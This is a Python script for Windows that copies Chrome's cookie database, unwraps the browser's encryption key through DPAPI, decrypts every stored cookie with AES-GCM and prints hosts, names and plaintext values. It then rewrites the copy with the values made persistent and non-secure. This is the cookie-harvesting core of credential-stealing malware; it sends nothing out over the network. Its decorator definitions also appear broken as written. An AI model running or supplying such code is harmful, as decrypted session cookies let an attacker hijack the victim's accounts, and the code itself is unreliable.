import os
import json
import sqlite3
import base64
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES 

class ChromeCookieDecryptor:
    def __init__(self):
        self.db_filename = "Cookies.db"
        self.chrome_cookie_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        self.aes_key = None
        
    def log_decorator(self, func):
        """Decorator to log functiona calls."""
        def wrapper(*args, **kwargs):
            print(f"Calling {func.__name__} with args: {args}, kwargs: {kwargs}")
            result = func(*args, **kwargs)
            print(f"{func.__name__} returned: {result}")
            return result
        return wrapper
    
    def error_handling_decorator(self, func):
        """Decorator to handle errors in functions."""
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                print(f"Error in {func.__name__}: {e}")
                return None
        return wrapper
    
    @log_decorator
    def convert_chrome_datetime(self, chrome_time):
        """Converts Chrome's 1601-based datetime format to Python's datetime."""
        if chrome_time != 86400000000 and chrome_time:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
            except Exception as e:
                print(f"Error: {e}, chrome_time: {chrome_time}")
                return chrome_time
        return ""
    
    @log_decorator
    def fetch_encryption_key(self):
        """Fetches the encryption key used to decrypt Chrome cookies."""
        state_file_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(state_file_path, 'r', encoding="utf-8") as file:
            state_data = json.load(file)
        encoded_key = base64.b64decode(state_data["os_crypt"]["encrypted_key"])
        key = encoded_key[5:]
        self.aes_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    @error_handling_decorator
    def decrypt_cookie_data(self, encrypted_data):
        """Decrypts cookie data using the provided AES key."""
        try:
            iv = encrypted_data[3:15]
            cipher_data = encrypted_data[15:]
            cipher = AES.new(self.aes_key, AES.MODE_GCM, iv)
            return cipher.decrypt(cipher_data)[:-16].decode()
        except:
            return str(win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1])
        
    @log_decorator
    def update_cookie_with_decrypted_value(self, cursor, host_key, cookie_name, decrypted_value):
        """Updates the cookie with the decrypted value in the database."""
        cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name =?", (decrypted_value, host_key, cookie_name))
    
    @error_handling_decorator
    def extract_cookies(self):
        """Extracts cookies from Chrome's database, decrypts them, and prints the results."""
        if not os.path.isfile(self.db_filename):
            shutil.copyfile(self.chrome_cookie_db, self.db_filename)
        conn = sqlite3.connect(self.db_filename)
        conn.text_factory = lambda b: b.decode(errors="ignore")
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
        for host, cookie_name, cookie_value, creation, last_access, expires, encrypted_value in cursor.fetchall():
            decrypted_value = cookie_value if cookie_value else self.decrypt_cookie_data(encrypted_value)
            print(f"""
            Host: {host}
            Cookie name: {cookie_name}
            Decrypted Cookie value: {decrypted_value}
            Creation time (UTC): {self.convert_chrome_datetime(creation)}
            Last accessed (UTC): {self.convert_chrome_datetime(last_access)}
            Expiration time (UTC): {self.convert_chrome_datetime(expires)}
            {"-"*70}""")
            self.update_cookie_with_decrypted_value(cursor, host, cookie_name, decrypted_value)
        conn.commit()
        conn.close()
        
    def run(self):
        """Main method to execute the cookie extraction and decryption process."""
        self.fetch_encryption_key()
        self.extract_cookies()
        
if __name__ == "__main__":
    cookie_decryptor = ChromeCookieDecryptor()
    cookie_decryptor.run()
